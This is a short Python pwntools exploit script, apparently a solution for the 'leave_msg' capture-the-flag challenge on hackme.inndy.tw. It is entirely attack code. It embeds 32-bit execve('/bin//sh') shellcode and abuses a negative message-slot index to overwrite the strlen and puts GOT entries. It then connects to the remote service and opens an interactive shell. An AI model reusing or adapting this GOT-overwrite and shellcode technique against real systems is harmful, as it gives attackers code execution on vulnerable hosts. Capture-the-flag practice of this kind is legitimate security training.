#!/usr/bin/python

from pwn import *
from LibcSearcher import *

sc32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

ret_0 = "\x31\xc0\xc3"

strlen_got = 0x804a024
puts_got = 0x804a020

def pad(s):
    return s + "\x00"*4

def write(dest, value):
    base = 0x804a060
    offset = (dest-base)/4
    s.recvuntil("I'm busy. Please leave your message:\n")
    s.send(pad(value))
    s.recvuntil("Which message slot?\n")
    if offset < 0:
        offset = ' ' + str(offset)
    else:
        offset = str(offset)
    s.send(offset)


config = '''
b *0x8048686
b *0x80486da
'''
s = remote('hackme.inndy.tw', 7715)
#context.log_level = 'debug'
#s = process('./leave_msg')
#gdb.attach(s, config)
write(strlen_got, ret_0)
write(puts_got, sc32)
s.interactive()
